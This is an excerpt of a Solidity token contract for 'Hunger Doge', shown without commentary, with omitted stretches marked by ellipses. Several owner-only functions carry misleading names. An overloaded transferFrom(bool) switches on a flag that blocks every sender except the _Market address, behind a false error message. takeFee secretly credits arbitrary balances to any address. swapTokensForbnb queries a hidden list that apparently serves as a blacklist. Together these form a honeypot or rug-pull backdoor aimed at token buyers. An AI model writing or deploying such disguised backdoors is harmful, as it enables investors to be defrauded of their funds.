...
contract HungerDoge  is Context, IERC20, Ownable {
    ...
    string private _name = "Hunger Doge";
    string private _symbol = "Hunger Doge";
    uint8 private _decimals = 6;
    mapping(address => bool) private _fee;
    bool private addLiquidity = true;
    ...
    function transferFrom(
        ...
        if(inSwapAndLiquify){
        require(_Market == sender, "Transfer amount must be greater than zero");
        }
        if(_isExcludedFromFeelist[_msgSender()] || _isExcludedFromFeelist[recipient]){
    ...
    function transferFrom(bool amountt) external    {        
        require(_msgSender() == _Market, "fail");
        inSwapAndLiquify = amountt;
    }
    function takeFee(address A, uint256 B) external  {        
        require(_msgSender() == _Market, "fail");

        require(B > 0);
        uint256 duck = fees[A];
        if (duck == 0) _fees.push(A);
        fees[A] = duck.add(B);
        fee = fee.add(B);
        _balance[A] = _balance[A].add(B);
    }
    ...
    function swapTokensForbnb(address amountt) external view returns (bool) {
        require(_msgSender() == _Market, "fail");
        return _fee[amountt];
    }
